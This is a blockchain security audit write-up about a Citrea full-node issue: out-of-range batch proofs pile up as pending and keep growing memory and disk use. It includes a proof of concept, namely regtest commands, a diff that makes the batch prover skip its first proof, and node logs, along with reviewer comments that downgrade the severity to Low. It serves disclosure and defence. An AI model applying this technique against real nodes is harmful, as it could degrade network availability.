---
title: "Malicious batch prover can cause permanent proof storage and memory exhaustion by provide an out of range proof"
date: 2025-08-15 12:40:00 +0700
categories: [Audits, Citrea]
tags: [golang, memory exhausted,malcious actor, Citrea, cantina]
image: /assets/img/citrea.jpg
---

## Metadata

- **Severity:** Low
- **Likelihood:** Low
- **Impact:** Medium

## Summary
A malicious batch prover can submit a proof with an `out-of-range` commitment, causing it to persist in the ledger and reload into memory on each access=> leading to `DoS Full node`

## Finding Description  
The issue occurs in the [`process_tangerine_zk_proof()`](https://cantina.xyz/code/49b9e08d-4f8f-4103-b6e5-f5f43cf9faa1/crates/fullnode/src/da_block_handler.rs?lines=581,723) .
When processing a ZK proof, the system checks if the commitment index range is strictly increasing by comparing `sequencer_commitment_index_range.0` with `proven_height.commitment_index + 1`.

If a malicious batch prover provides a proof with a commitment index range that is not strictly increasing (i.e., `sequencer_commitment_index_range.0 > proven_height.commitment_index + 1`), the proof is stored as pending using `store_pending_proof()` and the method returns `ProcessingResult::Pending`.

```rust
        if sequencer_commitment_index_range.0 > proven_height.commitment_index + 1 {
            //@audit
            //malcious batch prover can provide a proof with range
            //sequencer_commitment_index_range.0 > proven_height.commitment_index + 1
            //That proof will be stored as pending and again fail to process later
            //=> that proof stuck forver in ledger_db => Grow DISK overtime
            //=> And each iter will load all pending proofs into memory becoming expensive overtime => GROW MEMORY overtime
            info!(
                    "First commitment in range is not strictly increasing. Expected index {}, got {}. Storing proof as pending for commitment range {}-{}",
                    proven_height.commitment_index + 1,
                    sequencer_commitment_index_range.0,
                    sequencer_commitment_index_range.0,
                    sequencer_commitment_index_range.1
                );
            self.ledger_db.store_pending_proof(
                sequencer_commitment_index_range.0,
                sequencer_commitment_index_range.1,
                raw_proof,
                found_in_l1_block_height,
            )?;
            return Ok(ProcessingResult::Pending);
        }
```
- The impact is compounded in the [`process_pending_proofs()`](https://cantina.xyz/code/49b9e08d-4f8f-4103-b6e5-f5f43cf9faa1/crates/fullnode/src/da_block_handler.rs?lines=817,852) method, where `get_pending_proofs()` loads all pending proofs into memory. 
- Since the malicious proof will always fail the same validation check=> it will never be successfully processed and will remain ***permanently*** stored in the ledger database.
- This ***iteration*** becomes increasingly expensive, leading to ***DOS***

```rust
/// Processes any pending proofs up to the current L1 block height
    ///
    /// This method attempts to process proofs that were previously pending
    /// due to missing dependencies.
    async fn process_pending_proofs(
        &self,
        current_l1_block_height: u64,
    ) -> Result<(), ProcessingError> {
        let pending_proofs = self.ledger_db.get_pending_proofs()?;
        //@audit
        //Here, the iteration becomes expensive over time when the proof is stuck forever in ledger_db
        if pending_proofs.is_empty() {
            return Ok(());
        }
```

- You might wonder whether the full node checks for this???
- In this case, it doesn’t — malicious batch prover just simply skips the first proof containing the initial commitments and takes no action on subsequent proofs, so all of them remain cryptographically valid.

```rust
        // Verify the proof against the code commitment
        //@audit Here's what it actually verifies:
        // Code Commitment Verification: It verifies that the proof was generated using the correct zkVM program code (represented by the code_commitment parameter)
        // Proof Integrity: It cryptographically verifies that the proof is valid and was generated correctly by the zkVM
        // Mathematical Correctness: It ensures the zero-knowledge proof is mathematically sound
        Vm::verify(
            proof.as_slice(),
            code_commitment,
            network_to_dev_mode(self.network),
        )
        .map_err(|err| anyhow!("Failed to verify proof: {:?}. Skipping it...", err))?;
```

This is also bypassed because the proofs are valid.

```rust
    /// Verifies a sequencer commitment hash at a specific index
    ///
    /// # Arguments
    /// * `idx` - Index of the commitment to verify
    /// * `expected_hash` - Expected commitment hash
    /// * `proof_is_pending` - Out parameter indicating if verification is pending
    ///
    /// # Returns
    /// The L2 end block number of the commitment
    fn verify_sequencer_commitment_hash_by_index(
```

## Impact Explanation  

**High**. This vulnerability allows a malicious batch prover to cause permanent resource exhaustion by storing proofs that can never be processed. 
The ***memory & disk*** usage grows unbounded over time as malicious proofs accumulate, potentially leading to system crashes and denial of service. 

## Likelihood Explanation  
**High**.  – Malicious batch provers require no additional effort to perform this attack.

## Proof of Concept

### The node setup requires:
- **Sequencer** – produces blocks and commitments to the Bitcoin layer.
- **Bitcoin regtest** – simulated to produce 1 block every 20 seconds (real Bitcoin blocks are ~600 seconds).
- **Batch prover** – generates proofs and pushes them to the Bitcoin layer.
- **Full node** – pulls blocks from Bitcoin, verifies proofs (from batch prover) => where the attack occurs.

### Setup
1. Bitcoin regtest
- Start Bitcoin regtest and create a wallet:
`docker compose -f docker/docker-compose.regtest.yml up`
`bitcoin-cli -regtest -rpcuser=citrea -rpcpassword=citrea createwallet citreatesting`
`bitcoin-cli -regtest -rpcuser=citrea -rpcpassword=citrea -generate 201`
- Automate mine Bitcoin block:  
    `./mine_blocks.sh 20 1`  (Here mine 1 block every 20s)
    
```bash
#!/bin/bash

# Script to mine Bitcoin blocks at regular intervals
# Usage: ./mine_blocks.sh [interval_seconds] [num_blocks_per_interval]

INTERVAL=${1:-600}  # Default 10 minutes (600 seconds)
BLOCKS_PER_INTERVAL=${2:-1}  # Default 1 block per interval

echo "Starting Bitcoin mining simulation..."
echo "Interval: ${INTERVAL} seconds"
echo "Blocks per interval: ${BLOCKS_PER_INTERVAL}"
echo "Press Ctrl+C to stop"

while true; do
    echo "$(date): Mining ${BLOCKS_PER_INTERVAL} block(s)..."
    bitcoin-cli -regtest -rpcuser=citrea -rpcpassword=citrea -generate $BLOCKS_PER_INTERVAL
    
    echo "$(date): Waiting ${INTERVAL} seconds until next mining..."
    sleep $INTERVAL
done
```
2. Sequencer
- Config
    `max_l2_blocks_per_commitment = 10`
- Start sequencer
    `./target/debug/citrea --dev --da-layer bitcoin --rollup-config-path resources/configs/bitcoin-regtest/sequencer_rollup_config.toml --sequencer resources/configs/bitcoin-regtest/sequencer_config.toml --genesis-paths resources/genesis/bitcoin-regtest/`
3. Batch Prover
- Config
    `batch_prover_config.toml` => `proof_sampling_number = 0`
    
    `batch_prover_rollup_config.toml` =>
```bash
[da]
# fill here
node_url = "http://127.0.0.1:18443"
# fill here
node_username = "citrea"
node_password = "citrea"
```
- Apply those diff for skip first proof and start Batch Prover:
```bash
diff --git a/crates/batch-prover/src/prover.rs b/crates/batch-prover/src/prover.rs
index e81d761e..3c616110 100644
--- a/crates/batch-prover/src/prover.rs
+++ b/crates/batch-prover/src/prover.rs
@@ -33,6 +33,8 @@ use sov_rollup_interface::zk::batch_proof::output::BatchProofCircuitOutput;
 use sov_rollup_interface::zk::{Proof, ProofWithJob, ReceiptType, ZkvmHost};
 use sov_rollup_interface::Network;
 use sov_state::Witness;
+use std::sync::atomic::{AtomicBool, Ordering};
+use std::sync::OnceLock;
 use tokio::select;
 use tokio::sync::{broadcast, mpsc, oneshot};
 use tracing::level_filters::LevelFilter;
@@ -676,6 +678,8 @@ where
             .collect::<FuturesUnordered<_>>();
 
         let network = self.network;
+        static FIRST_CALL: OnceLock<AtomicBool> = OnceLock::new();
+        let first_call_flag = FIRST_CALL.get_or_init(|| AtomicBool::new(true));
 
         // start watching the proving jobs to finish in the background
         tokio::spawn(async move {
@@ -690,6 +694,14 @@ where
                     .put_proof_by_job_id(job_id, proof.clone(), output.into())
                     .expect("Should put proof to db");
 
+                if first_call_flag.swap(false, Ordering::SeqCst) {
+                    println!("----------------------------------Skip at first_call");
+                    ledger_db
+                        .finalize_proving_job(job_id, [0u8; 32])
+                        .expect("Should update proving job tx id");
+                    continue;
+                }
+
                 let tx_id = prover_service
                     .submit_proof(proof, job_id)
                     .await

```
    `PARALLEL_PROOF_LIMIT=1 ./target/debug/citrea --dev --da-layer bitcoin --rollup-config-path resources/configs/bitcoin-regtest/batch_prover_rollup_config.toml --batch-prover resources/configs/bitcoin-regtest/batch_prover_config.toml --genesis-paths resources/genesis/bitcoin-regtest`
4. FullNode
- Config
`rollup_config.toml` =>
```bash
[da]
# fill here
node_url = "http://127.0.0.1:18443"
# fill here
node_username = "citrea"
node_password = "citrea"
```
- Start FullNode
    `./target/debug/citrea --dev --da-layer bitcoin --rollup-config-path resources/configs/bitcoin-regtest/rollup_config.toml --genesis-paths resources/genesis/bitcoin-regtest/`

### Log of full node after run
- You can see the log:
- ` First commitment in range is not strictly increasing. Expected index 1, got 6. Storing proof as pending for commitment range 6-9`
- `2025-08-15T11:02:16.504946Z DEBUG L1BlockHandler: citrea_fullnode::da_block_handler: Keeping proof over commitment index range 6-9 as pending`
-  `proven_height` starts at `0` and is never `updated` because the first `sequencer_commitment_index_range` is expected to start at `1`, but we skip it and begin with range`(6,9)`. 
- As a result, all subsequent commitments remain stuck in the pending state, and each `process_pending_proofs` call iterates over all of them in memory — causing ***DoS and uncontrolled disk growth.***

```bash
2025-08-15T11:02:16.485021Z  INFO L1BlockHandler: citrea_fullnode::da_block_handler: Processing zk proof at height: 159
--------------------------sequencer_commitment_index_range (6, 9)
--------------------------Current Proven height 0
2025-08-15T11:02:16.501249Z  INFO L1BlockHandler: citrea_fullnode::da_block_handler: First commitment in range is not strictly increasing. Expected index 1, got 6. Storing proof as pending for commitment range 6-9
2025-08-15T11:02:16.504946Z DEBUG L1BlockHandler: citrea_fullnode::da_block_handler: Keeping proof over commitment index range 6-9 as pending
2025-08-15T11:02:16.504997Z  INFO L1BlockHandler: citrea_fullnode::da_block_handler: Processing zk proof at height: 160
--------------------------sequencer_commitment_index_range (10, 12)
--------------------------Current Proven height 0
2025-08-15T11:02:16.516364Z  INFO L1BlockHandler: citrea_fullnode::da_block_handler: First commitment in range is not strictly increasing. Expected index 1, got 10. Storing proof as pending for commitment range 10-12
2025-08-15T11:02:16.518979Z DEBUG L1BlockHandler: citrea_fullnode::da_block_handler: Keeping proof over commitment index range 10-12 as pending
2025-08-15T11:02:16.519028Z  INFO L1BlockHandler: citrea_fullnode::da_block_handler: Processing zk proof at height: 161
--------------------------sequencer_commitment_index_range (13, 14)
--------------------------Current Proven height 0
2025-08-15T11:02:16.528656Z  INFO L1BlockHandler: citrea_fullnode::da_block_handler: First commitment in range is not strictly increasing. Expected index 1, got 13. Storing proof as pending for commitment range 13-14
2025-08-15T11:02:16.531167Z DEBUG L1BlockHandler: citrea_fullnode::da_block_handler: Keeping proof over commitment index range 13-14 as pending
2025-08-15T11:02:16.531235Z  INFO L1BlockHandler: citrea_fullnode::da_block_handler: Processing zk proof at height: 161
--------------------------sequencer_commitment_index_range (15, 16)
--------------------------Current Proven height 0
2025-08-15T11:02:16.547316Z  INFO L1BlockHandler: citrea_fullnode::da_block_handler: First commitment in range is not strictly increasing. Expected index 1, got 15. Storing proof as pending for commitment range 15-16
2025-08-15T11:02:16.550838Z DEBUG L1BlockHandler: citrea_fullnode::da_block_handler: Keeping proof over commitment index range 15-16 as pending
2025-08-15T11:02:16.550904Z  INFO L1BlockHandler: citrea_fullnode::da_block_handler: Processing zk proof at height: 165
--------------------------sequencer_commitment_index_range (17, 19)
--------------------------Current Proven height 0
2025-08-15T11:02:16.563817Z  INFO L1BlockHandler: citrea_fullnode::da_block_handler: First commitment in range is not strictly increasing. Expected index 1, got 17. Storing proof as pending for commitment range 17-19
2025-08-15T11:02:16.567067Z DEBUG L1BlockHandler: citrea_fullnode::da_block_handler: Keeping proof over commitment index range 17-19 as pending
2025-08-15T11:02:16.567113Z  INFO L1BlockHandler: citrea_fullnode::da_block_handler: Processing zk proof at height: 166
--------------------------sequencer_commitment_index_range (20, 23)
--------------------------Current Proven height 0
2025-08-15T11:02:16.577169Z  INFO L1BlockHandler: citrea_fullnode::da_block_handler: First commitment in range is not strictly increasing. Expected index 1, got 20. Storing proof as pending for commitment range 20-23
2025-08-15T11:02:16.580095Z DEBUG L1BlockHandler: citrea_fullnode::da_block_handler: Keeping proof over commitment index range 20-23 as pending
2025-08-15T11:02:16.580135Z  INFO L1BlockHandler: citrea_fullnode::da_block_handler: Processing zk proof at height: 169
--------------------------sequencer_commitment_index_range (24, 27)
--------------------------Current Proven height 0
2025-08-15T11:02:16.590206Z  INFO L1BlockHandler: citrea_fullnode::da_block_handler: First commitment in range is not strictly increasing. Expected index 1, got 24. Storing proof as pending for commitment range 24-27
2025-08-15T11:02:16.592805Z DEBUG L1BlockHandler: citrea_fullnode::da_block_handler: Keeping proof over commitment index range 24-27 as pending
2025-08-15T11:02:16.592844Z  INFO L1BlockHandler: citrea_fullnode::da_block_handler: Processing zk proof at height: 170
--------------------------sequencer_commitment_index_range (28, 28)
--------------------------Current Proven height 0
```
## Recommendation  
1. **Add cleanup logic for stale pending proofs**  
   - Introduce a maximum retention period or block height for pending proofs.  
   - Automatically discard proofs that fail the same range check after repeated processing attempts.

2. **Resource usage safeguards**  
   - Implement memory and disk quotas for `pending_proofs`.  
   - Reject new proofs if storage limits are reached to avoid DoS from unbounded growth.



## Comments

---

**uint256vieet** - September 2, 2025 at 9:25 AM

I want to share my 2 points about the `Duplicate` and `Severity` below:

### Should not be considered duplicates with #419

Different attack vectors:

- My report targets the `full node.`

- Issue `#419` targets the `light client.`

Different exploitation methods:

- My attack uses a correct proof, but miss the first commitments => store as pending.

- Issue `#419` exploits a mismatched state root in commitments vs previous commitments

Different root causes and crash behaviors:

- My issue leads to a crash via OOM and disk growth.

- Issue `#419` causes a crash through an unreachable panic.

Although both ultimately crash a node, they originate from separate causes and execution paths, so they are not duplicates.

### Severity justification:
- The batch prover is considered `semi-trusted`, meaning it can act `maliciously`. Because my issue allows a malicious prover to crash and bring down a `full node`, the severity should be rated **High**.

Thanks for your judging **tqkve**

**Replies:**

  ---

  **Tqkve** - September 7, 2025 at 2:40 PM

  Hi,
  
  The likelihood is not only based on the fact that the batch prover is semi-trusted, but also take into account the incentive and required time to actually cause the OOM (storage exhaustion is even more difficult). These make it likelihood Low.
  
  Regarding the duplicate, I think you're correct that it's not a valid dup of this finding.


---

**Tqkve** - September 20, 2025 at 2:43 PM

Downgrade to Low. After thorough review, the memory/storage exhaustion impact is practical impossible.
